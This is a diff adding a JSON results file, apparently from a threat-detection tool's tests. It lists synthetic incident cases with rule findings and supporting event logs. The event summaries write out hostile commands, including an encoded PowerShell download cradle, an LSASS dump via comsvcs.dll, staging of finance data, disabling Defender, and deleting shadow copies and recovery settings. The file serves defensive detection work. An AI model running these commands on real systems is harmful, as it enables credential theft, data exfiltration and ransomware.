+     "reason": "powershell.exe made 7 outbound connection(s) to the external address 185.220.101.47 on port(s) 80, 443. Script interpreters do not normally initiate direct internet connections; this may indicate payload retrieval or command-and-control. The connection to port 80 indicates cleartext HTTP, which is commonly used to retrieve a second-stage script.",
+     "event_ids": [
+      "evt-000358",
+      "evt-000362",
+      "evt-000380",
+      "evt-000399",
+      "evt-000421",
+      "evt-000454",
+      "evt-000486"
+     ]
+    },
+    {
+     "finding_id": "ATH-010:evt-000367",
+     "rule_id": "ATH-010",
+     "title": "Sequence of discovery commands from one parent process",
+     "severity": "MEDIUM",
+     "device": "PC01",
+     "actor": "jdoe",
+     "reason": "3 distinct discovery commands (net.exe, nltest.exe, whoami.exe) ran from the same parent process (PID 6612) within 34s, consistent with systematic reconnaissance of the local environment and domain.",
+     "event_ids": [
+      "evt-000367",
+      "evt-000370",
+      "evt-000374"
+     ]
+    },
+    {
+     "finding_id": "ATH-004:evt-000381",
+     "rule_id": "ATH-004",
+     "title": "Possible LSASS credential access",
+     "severity": "CRITICAL",
+     "device": "PC01",
+     "actor": "jdoe",
+     "reason": "Command line matched credential-access indicators (comsvcs.dll MiniDump, explicit lsass reference, rundll32 MiniDump export). This may indicate an attempt to extract credential material from LSASS memory, which would enable authentication as other users. Requires immediate verification against the account's expected activity.",
+     "event_ids": [
+      "evt-000381"
+     ]
+    },
+    {
+     "finding_id": "ATH-005:evt-000419",
+     "rule_id": "ATH-005",
+     "title": "Failed logon burst followed by successful authentication",
+     "severity": "CRITICAL",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "reason": "14 failed logons for 'svc_backup' on FS02 from 10.10.20.15 within 143s. A successful logon followed at 09:33:47, 204s after the last failure. This may indicate the credential was successfully guessed and the account is now compromised.",
+     "event_ids": [
+      "evt-000419",
+      "evt-000422",
+      "evt-000425",
+      "evt-000427",
+      "evt-000429",
+      "evt-000431",
+      "evt-000432",
+      "evt-000433",
+      "evt-000437",
+      "evt-000438",
+      "evt-000439",
+      "evt-000440",
+      "evt-000442",
+      "evt-000444",
+      "evt-000457"
+     ]
+    },
+    {
+     "finding_id": "ATH-006:evt-000457",
+     "rule_id": "ATH-006",
+     "title": "Account authenticated from a host where it has no session",
+     "severity": "HIGH",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "reason": "Account 'svc_backup' authenticated to FS02 from PC01, but has no interactive session on PC01 (observed owner(s): jdoe). Credential use originating from a host the account does not operate on is consistent with lateral movement using stolen credentials, though legitimate alternate-credential workflows produce the same pattern.",
+     "event_ids": [
+      "evt-000457"
+     ]
+    },
+    {
+     "finding_id": "ATH-007:evt-000461",
+     "rule_id": "ATH-007",
+     "title": "Remote service execution (PsExec-style)",
+     "severity": "HIGH",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "reason": "The Service Control Manager started an interactive command interpreter. This pattern is consistent with remote command execution via a temporary service. Command output is redirected to the administrative share '\\\\127.0.0.1\\ADMIN$', which is characteristic of remote execution frameworks collecting results over SMB.",
+     "event_ids": [
+      "evt-000461"
+     ]
+    },
+    {
+     "finding_id": "ATH-008:evt-000469",
+     "rule_id": "ATH-008",
+     "title": "Bulk data staged into an archive",
+     "severity": "HIGH",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "reason": "An archive utility was invoked and the source path uses a wildcard, implying bulk collection and the destination is a shared staging directory. This is consistent with staging data prior to exfiltration, but does not by itself show that any data left the network.",
+     "event_ids": [
+      "evt-000469"
+     ]
+    },
+    {
+     "finding_id": "ATH-003:evt-000481",
+     "rule_id": "ATH-003",
+     "title": "Script interpreter connected to an external host",
+     "severity": "MEDIUM",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "reason": "powershell.exe made 1 outbound connection(s) to the external address 185.220.101.47 on port(s) 443. Script interpreters do not normally initiate direct internet connections; this may indicate payload retrieval or command-and-control.",
+     "event_ids": [
+      "evt-000481"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "evt-000355",
+    "evt-000357",
+    "evt-000358",
+    "evt-000362",
+    "evt-000367",
+    "evt-000370",
+    "evt-000374",
+    "evt-000380",
+    "evt-000381",
+    "evt-000399",
+    "evt-000419",
+    "evt-000421",
+    "evt-000422",
+    "evt-000425",
+    "evt-000427",
+    "evt-000429",
+    "evt-000431",
+    "evt-000432",
+    "evt-000433",
+    "evt-000437",
+    "evt-000438",
+    "evt-000439",
+    "evt-000440",
+    "evt-000442",
+    "evt-000444",
+    "evt-000454",
+    "evt-000457",
+    "evt-000461",
+    "evt-000469",
+    "evt-000481",
+    "evt-000486"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "evt-000355": {
+     "timestamp": "2026-08-17 09:12:04+00:00",
+     "device": "PC01",
+     "actor": "jdoe",
+     "event_type": "process",
+     "summary": "OUTLOOK.EXE -> WINWORD.EXE | \"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jdoe\\Downloads\\Invoice_Q3_2026.docm\""
+    },
+    "evt-000357": {
+     "timestamp": "2026-08-17 09:12:41+00:00",
+     "device": "PC01",
+     "actor": "jdoe",
+     "event_type": "process",
+     "summary": "WINWORD.EXE -> powershell.exe | powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnA"
+    },
+    "evt-000358": {
+     "timestamp": "2026-08-17 09:12:43+00:00",
+     "device": "PC01",
+     "actor": "jdoe",
+     "event_type": "network",
+     "summary": "powershell.exe -> 185.220.101.47:80 (outbound)"
+    },
+    "evt-000362": {
+     "timestamp": "2026-08-17 09:13:10+00:00",
+     "device": "PC01",
+     "actor": "jdoe",
+     "event_type": "network",
+     "summary": "powershell.exe -> 185.220.101.47:443 (outbound)"
+    },
+    "evt-000367": {
+     "timestamp": "2026-08-17 09:15:03+00:00",
+     "device": "PC01",
+     "actor": "jdoe",
+     "event_type": "process",
+     "summary": "powershell.exe -> whoami.exe | whoami.exe /all"
+    },
+    "evt-000370": {
+     "timestamp": "2026-08-17 09:15:20+00:00",
+     "device": "PC01",
+     "actor": "jdoe",
+     "event_type": "process",
+     "summary": "powershell.exe -> net.exe | net group \"Domain Admins\" /domain"
+    },
+    "evt-000374": {
+     "timestamp": "2026-08-17 09:15:37+00:00",
+     "device": "PC01",
+     "actor": "jdoe",
+     "event_type": "process",
+     "summary": "powershell.exe -> nltest.exe | nltest /domain_trusts"
+    },
+    "evt-000380": {
+     "timestamp": "2026-08-17 09:18:10+00:00",
+     "device": "PC01",
+     "actor": "jdoe",
+     "event_type": "network",
+     "summary": "powershell.exe -> 185.220.101.47:443 (outbound)"
+    },
+    "evt-000381": {
+     "timestamp": "2026-08-17 09:18:22+00:00",
+     "device": "PC01",
+     "actor": "jdoe",
+     "event_type": "process",
+     "summary": "powershell.exe -> rundll32.exe | rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Users\\Public\\lsass.dmp full"
+    },
+    "evt-000399": {
+     "timestamp": "2026-08-17 09:23:10+00:00",
+     "device": "PC01",
+     "actor": "jdoe",
+     "event_type": "network",
+     "summary": "powershell.exe -> 185.220.101.47:443 (outbound)"
+    },
+    "evt-000419": {
+     "timestamp": "2026-08-17 09:28:00+00:00",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "event_type": "logon",
+     "summary": "failure logon [Network (SMB / share access)] from 10.10.20.15 reason=bad_password"
+    },
+    "evt-000421": {
+     "timestamp": "2026-08-17 09:28:10+00:00",
+     "device": "PC01",
+     "actor": "jdoe",
+     "event_type": "network",
+     "summary": "powershell.exe -> 185.220.101.47:443 (outbound)"
+    },
+    "evt-000422": {
+     "timestamp": "2026-08-17 09:28:11+00:00",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "event_type": "logon",
+     "summary": "failure logon [Network (SMB / share access)] from 10.10.20.15 reason=bad_password"
+    },
+    "evt-000425": {
+     "timestamp": "2026-08-17 09:28:22+00:00",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "event_type": "logon",
+     "summary": "failure logon [Network (SMB / share access)] from 10.10.20.15 reason=bad_password"
+    },
+    "evt-000427": {
+     "timestamp": "2026-08-17 09:28:33+00:00",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "event_type": "logon",
+     "summary": "failure logon [Network (SMB / share access)] from 10.10.20.15 reason=bad_password"
+    },
+    "evt-000429": {
+     "timestamp": "2026-08-17 09:28:44+00:00",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "event_type": "logon",
+     "summary": "failure logon [Network (SMB / share access)] from 10.10.20.15 reason=bad_password"
+    },
+    "evt-000431": {
+     "timestamp": "2026-08-17 09:28:55+00:00",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "event_type": "logon",
+     "summary": "failure logon [Network (SMB / share access)] from 10.10.20.15 reason=bad_password"
+    },
+    "evt-000432": {
+     "timestamp": "2026-08-17 09:29:06+00:00",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "event_type": "logon",
+     "summary": "failure logon [Network (SMB / share access)] from 10.10.20.15 reason=bad_password"
+    },
+    "evt-000433": {
+     "timestamp": "2026-08-17 09:29:17+00:00",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "event_type": "logon",
+     "summary": "failure logon [Network (SMB / share access)] from 10.10.20.15 reason=bad_password"
+    },
+    "evt-000437": {
+     "timestamp": "2026-08-17 09:29:28+00:00",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "event_type": "logon",
+     "summary": "failure logon [Network (SMB / share access)] from 10.10.20.15 reason=bad_password"
+    },
+    "evt-000438": {
+     "timestamp": "2026-08-17 09:29:39+00:00",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "event_type": "logon",
+     "summary": "failure logon [Network (SMB / share access)] from 10.10.20.15 reason=bad_password"
+    },
+    "evt-000439": {
+     "timestamp": "2026-08-17 09:29:50+00:00",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "event_type": "logon",
+     "summary": "failure logon [Network (SMB / share access)] from 10.10.20.15 reason=bad_password"
+    },
+    "evt-000440": {
+     "timestamp": "2026-08-17 09:30:01+00:00",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "event_type": "logon",
+     "summary": "failure logon [Network (SMB / share access)] from 10.10.20.15 reason=bad_password"
+    },
+    "evt-000442": {
+     "timestamp": "2026-08-17 09:30:12+00:00",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "event_type": "logon",
+     "summary": "failure logon [Network (SMB / share access)] from 10.10.20.15 reason=bad_password"
+    },
+    "evt-000444": {
+     "timestamp": "2026-08-17 09:30:23+00:00",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "event_type": "logon",
+     "summary": "failure logon [Network (SMB / share access)] from 10.10.20.15 reason=bad_password"
+    },
+    "evt-000454": {
+     "timestamp": "2026-08-17 09:33:10+00:00",
+     "device": "PC01",
+     "actor": "jdoe",
+     "event_type": "network",
+     "summary": "powershell.exe -> 185.220.101.47:443 (outbound)"
+    },
+    "evt-000457": {
+     "timestamp": "2026-08-17 09:33:47+00:00",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "event_type": "logon",
+     "summary": "success logon [Network (SMB / share access)] from 10.10.20.15"
+    },
+    "evt-000461": {
+     "timestamp": "2026-08-17 09:34:12+00:00",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "event_type": "process",
+     "summary": "services.exe -> cmd.exe | cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\__1755419652 2>&1"
+    },
+    "evt-000469": {
+     "timestamp": "2026-08-17 09:35:40+00:00",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "event_type": "process",
+     "summary": "cmd.exe -> powershell.exe | powershell.exe -nop -c Compress-Archive -Path D:\\Finance\\* -DestinationPath C:\\Windows\\Temp\\fin.zip"
+    },
+    "evt-000481": {
+     "timestamp": "2026-08-17 09:37:05+00:00",
+     "device": "FS02",
+     "actor": "svc_backup",
+     "event_type": "network",
+     "summary": "powershell.exe -> 185.220.101.47:443 (outbound)"
+    },
+    "evt-000486": {
+     "timestamp": "2026-08-17 09:38:10+00:00",
+     "device": "PC01",
+     "actor": "jdoe",
+     "event_type": "network",
+     "summary": "powershell.exe -> 185.220.101.47:443 (outbound)"
+    }
+   }
+  },
+  {
+   "corpus": "synthetic:INC-002",
+   "case_id": "CASE-001",
+   "rebuilt": true,
+   "severity": "CRITICAL",
+   "rule_ids": [
+    "ATH-005"
+   ],
+   "findings": [
+    {
+     "finding_id": "ATH-005:cloudtrail-logon-000002",
+     "rule_id": "ATH-005",
+     "title": "Failed logon burst followed by successful authentication",
+     "severity": "CRITICAL",
+     "device": "aws:123456789012/us-east-1",
+     "actor": "dev_alice",
+     "reason": "12 failed logons for 'dev_alice' on aws:123456789012/us-east-1 from 203.0.113.42 within 220s. A successful logon followed at 09:16:30, 50s after the last failure. This may indicate the credential was successfully guessed and the account is now compromised.",
+     "event_ids": [
+      "cloudtrail-logon-000002",
+      "cloudtrail-logon-000003",
+      "cloudtrail-logon-000004",
+      "cloudtrail-logon-000005",
+      "cloudtrail-logon-000006",
+      "cloudtrail-logon-000007",
+      "cloudtrail-logon-000008",
+      "cloudtrail-logon-000009",
+      "cloudtrail-logon-000010",
+      "cloudtrail-logon-000011",
+      "cloudtrail-logon-000012",
+      "cloudtrail-logon-000013",
+      "cloudtrail-logon-000014"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "cloudtrail-logon-000002",
+    "cloudtrail-logon-000003",
+    "cloudtrail-logon-000004",
+    "cloudtrail-logon-000005",
+    "cloudtrail-logon-000006",
+    "cloudtrail-logon-000007",
+    "cloudtrail-logon-000008",
+    "cloudtrail-logon-000009",
+    "cloudtrail-logon-000010",
+    "cloudtrail-logon-000011",
+    "cloudtrail-logon-000012",
+    "cloudtrail-logon-000013",
+    "cloudtrail-logon-000014"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "cloudtrail-logon-000002": {
+     "timestamp": "2026-08-17 09:12:00+00:00",
+     "device": "aws:123456789012/us-east-1",
+     "actor": "dev_alice",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 203.0.113.42 reason=Failed authentication"
+    },
+    "cloudtrail-logon-000003": {
+     "timestamp": "2026-08-17 09:12:20+00:00",
+     "device": "aws:123456789012/us-east-1",
+     "actor": "dev_alice",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 203.0.113.42 reason=Failed authentication"
+    },
+    "cloudtrail-logon-000004": {
+     "timestamp": "2026-08-17 09:12:40+00:00",
+     "device": "aws:123456789012/us-east-1",
+     "actor": "dev_alice",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 203.0.113.42 reason=Failed authentication"
+    },
+    "cloudtrail-logon-000005": {
+     "timestamp": "2026-08-17 09:13:00+00:00",
+     "device": "aws:123456789012/us-east-1",
+     "actor": "dev_alice",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 203.0.113.42 reason=Failed authentication"
+    },
+    "cloudtrail-logon-000006": {
+     "timestamp": "2026-08-17 09:13:20+00:00",
+     "device": "aws:123456789012/us-east-1",
+     "actor": "dev_alice",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 203.0.113.42 reason=Failed authentication"
+    },
+    "cloudtrail-logon-000007": {
+     "timestamp": "2026-08-17 09:13:40+00:00",
+     "device": "aws:123456789012/us-east-1",
+     "actor": "dev_alice",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 203.0.113.42 reason=Failed authentication"
+    },
+    "cloudtrail-logon-000008": {
+     "timestamp": "2026-08-17 09:14:00+00:00",
+     "device": "aws:123456789012/us-east-1",
+     "actor": "dev_alice",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 203.0.113.42 reason=Failed authentication"
+    },
+    "cloudtrail-logon-000009": {
+     "timestamp": "2026-08-17 09:14:20+00:00",
+     "device": "aws:123456789012/us-east-1",
+     "actor": "dev_alice",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 203.0.113.42 reason=Failed authentication"
+    },
+    "cloudtrail-logon-000010": {
+     "timestamp": "2026-08-17 09:14:40+00:00",
+     "device": "aws:123456789012/us-east-1",
+     "actor": "dev_alice",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 203.0.113.42 reason=Failed authentication"
+    },
+    "cloudtrail-logon-000011": {
+     "timestamp": "2026-08-17 09:15:00+00:00",
+     "device": "aws:123456789012/us-east-1",
+     "actor": "dev_alice",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 203.0.113.42 reason=Failed authentication"
+    },
+    "cloudtrail-logon-000012": {
+     "timestamp": "2026-08-17 09:15:20+00:00",
+     "device": "aws:123456789012/us-east-1",
+     "actor": "dev_alice",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 203.0.113.42 reason=Failed authentication"
+    },
+    "cloudtrail-logon-000013": {
+     "timestamp": "2026-08-17 09:15:40+00:00",
+     "device": "aws:123456789012/us-east-1",
+     "actor": "dev_alice",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 203.0.113.42 reason=Failed authentication"
+    },
+    "cloudtrail-logon-000014": {
+     "timestamp": "2026-08-17 09:16:30+00:00",
+     "device": "aws:123456789012/us-east-1",
+     "actor": "dev_alice",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 203.0.113.42"
+    },
+    "cloudtrail-logon-000015": {
+     "timestamp": "2026-08-17 09:21:00+00:00",
+     "device": "aws:123456789012/us-east-1",
+     "actor": "dev_alice",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 203.0.113.42"
+    }
+   }
+  },
+  {
+   "corpus": "synthetic:INC-005",
+   "case_id": "CASE-001",
+   "rebuilt": true,
+   "severity": "CRITICAL",
+   "rule_ids": [
+    "K8S-001",
+    "K8S-002"
+   ],
+   "findings": [
+    {
+     "finding_id": "K8S-001:k8s-control-000003",
+     "rule_id": "K8S-001",
+     "title": "RBAC binding grants a maximally-privileged role",
+     "severity": "HIGH",
+     "device": "k8s:test-cluster",
+     "actor": "system:serviceaccount:ci:ci-runner",
+     "reason": "'system:serviceaccount:ci:ci-deployer' created clusterrolebindings 'ci-runner-escalation', granting the maximally-privileged role 'cluster-admin' to 'system:serviceaccount:ci:ci-runner'. Very few legitimate workloads need this level of access, and the grantor is not a superuser, so this grant confers standing the grantor did not itself hold; it is worth review even when the grantor is an ordinary administrative account.",
+     "event_ids": [
+      "k8s-control-000003"
+     ]
+    },
+    {
+     "finding_id": "K8S-002:k8s-control-000003",
+     "rule_id": "K8S-002",
+     "title": "Pod exec by an identity shortly after receiving a privileged RBAC grant",
+     "severity": "CRITICAL",
+     "device": "k8s:test-cluster",
+     "actor": "system:serviceaccount:ci:ci-runner",
+     "reason": "'system:serviceaccount:ci:ci-runner' was granted the 'cluster-admin' role 149s before exec'ing into pod 'web-1' (namespace 'prod'). A freshly-escalated identity acting on that escalation shortly after receiving it is consistent with the grant being used for exploration or post-exploitation access rather than left dormant.",
+     "event_ids": [
+      "k8s-control-000003",
+      "k8s-control-000004"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "k8s-control-000003",
+    "k8s-control-000004"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "k8s-control-000003": {
+     "timestamp": "2026-08-17 09:20:00.040000+00:00",
+     "device": "k8s:test-cluster",
+     "actor": "system:serviceaccount:ci:ci-runner",
+     "event_type": "control",
+     "summary": "system:serviceaccount:ci:ci-deployer create clusterrolebindings (ci-runner-escalation) -> system:serviceaccount:ci:ci-runner [allowed]"
+    },
+    "k8s-control-000004": {
+     "timestamp": "2026-08-17 09:22:30.015000+00:00",
+     "device": "k8s:test-cluster",
+     "actor": "system:serviceaccount:ci:ci-runner",
+     "event_type": "control",
+     "summary": "system:serviceaccount:ci:ci-runner exec pods/exec (web-1) [allowed]"
+    }
+   }
+  },
+  {
+   "corpus": "synthetic:INC-004",
+   "case_id": "CASE-001",
+   "rebuilt": true,
+   "severity": "CRITICAL",
+   "rule_ids": [
+    "ATH-011",
+    "ATH-012"
+   ],
+   "findings": [
+    {
+     "finding_id": "ATH-012:evt-000901",
+     "rule_id": "ATH-012",
+     "title": "Security product disabled or reconfigured",
+     "severity": "CRITICAL",
+     "device": "PC03",
+     "actor": "achen",
+     "reason": "3 distinct security-control change(s) on PC03 by 'achen': Defender real-time monitoring disabled; a Defender scanning exclusion was added; a security product process was terminated. A single change is often administrative; several in one window is the shape of an attacker clearing the way for what comes next.",
+     "event_ids": [
+      "evt-000901",
+      "evt-000905",
+      "evt-000909"
+     ]
+    },
+    {
+     "finding_id": "ATH-011:evt-000922",
+     "rule_id": "ATH-011",
+     "title": "Windows recovery mechanisms destroyed",
+     "severity": "CRITICAL",
+     "device": "PC03",
+     "actor": "achen",
+     "reason": "3 distinct recovery control(s) were destroyed on PC03 by 'achen': Windows backup catalog deleted; boot-time recovery disabled; volume shadow copies deleted. Destroying recovery paths removes the ability to roll back and commonly immediately precedes encryption.",
+     "event_ids": [
+      "evt-000922",
+      "evt-000925",
+      "evt-000927"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "evt-000901",
+    "evt-000905",
+    "evt-000909",
+    "evt-000922",
+    "evt-000925",
+    "evt-000927"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "evt-000026": {
+     "timestamp": "2026-08-17 08:00:19+00:00",
+     "device": "PC03",
+     "actor": "achen",
+     "event_type": "network",
+     "summary": "OUTLOOK.EXE -> 13.107.42.14:443 (outbound)"
+    },
+    "evt-000027": {
+     "timestamp": "2026-08-17 08:00:26+00:00",
+     "device": "FS02",
+     "actor": "achen",
+     "event_type": "logon",
+     "summary": "success logon [Network (SMB / share access)] from 10.10.20.17"
+    },
+    "evt-000048": {
+     "timestamp": "2026-08-17 08:05:30+00:00",
+     "device": "PC03",
+     "actor": "achen",
+     "event_type": "network",
+     "summary": "chrome.exe -> 52.113.194.132:443 (outbound)"
+    },
+    "evt-000059": {
+     "timestamp": "2026-08-17 08:10:33+00:00",
+     "device": "PC03",
+     "actor": "achen",
+     "event_type": "network",
+     "summary": "chrome.exe -> 10.10.10.10:445 (outbound)"
+    },
+    "evt-000070": {
+     "timestamp": "2026-08-17 08:12:19+00:00",
+     "device": "PC03",
+     "actor": "achen",
+     "event_type": "network",
+     "summary": "OUTLOOK.EXE -> 13.107.42.14:443 (outbound)"
+    },
+    "evt-000085": {
+     "timestamp": "2026-08-17 08:14:29+00:00",
+     "device": "APP01",
+     "actor": "achen",
+     "event_type": "logon",
+     "summary": "success logon [Network (SMB / share access)] from 10.10.20.17"
+    },
+    "evt-000090": {
+     "timestamp": "2026-08-17 08:14:58+00:00",
+     "device": "APP01",
+     "actor": "achen",
+     "event_type": "logon",
+     "summary": "success logon [Network (SMB / share access)] from 10.10.20.17"
+    },
+    "evt-000901": {
+     "timestamp": "2026-08-17 11:12:00+00:00",
+     "device": "PC03",
+     "actor": "achen",
+     "event_type": "process",
+     "summary": "cmd.exe -> powershell.exe | powershell.exe -nop -w hidden Set-MpPreference -DisableRealtimeMonitoring $true"
+    },
+    "evt-000905": {
+     "timestamp": "2026-08-17 11:12:35+00:00",
+     "device": "PC03",
+     "actor": "achen",
+     "event_type": "process",
+     "summary": "cmd.exe -> powershell.exe | powershell.exe Add-MpPreference -ExclusionPath C:\\ProgramData\\svc"
+    },
+    "evt-000907": {
+     "timestamp": "2026-08-17 11:12:38+00:00",
+     "device": "PC03",
+     "actor": "SYSTEM",
+     "event_type": "network",
+     "summary": "MsMpEng.exe -> 10.10.10.20:389 (outbound)"
+    },
+    "evt-000909": {
+     "timestamp": "2026-08-17 11:13:10+00:00",
+     "device": "PC03",
+     "actor": "achen",
+     "event_type": "process",
+     "summary": "cmd.exe -> taskkill.exe | taskkill.exe /F /IM MsMpEng.exe"
+    },
+    "evt-000922": {
+     "timestamp": "2026-08-17 11:14:30+00:00",
+     "device": "PC03",
+     "actor": "achen",
+     "event_type": "process",
+     "summary": "cmd.exe -> vssadmin.exe | vssadmin.exe delete shadows /all /quiet"
+    },
+    "evt-000925": {
+     "timestamp": "2026-08-17 11:15:05+00:00",
+     "device": "PC03",
+     "actor": "achen",
+     "event_type": "process",
+     "summary": "cmd.exe -> wbadmin.exe | wbadmin.exe delete catalog -quiet"
+    },
+    "evt-000927": {
+     "timestamp": "2026-08-17 11:15:40+00:00",
+     "device": "PC03",
+     "actor": "achen",
+     "event_type": "process",
+     "summary": "cmd.exe -> bcdedit.exe | bcdedit.exe /set {default} recoveryenabled no"
+    }
+   }
+  }
+ ]
+}
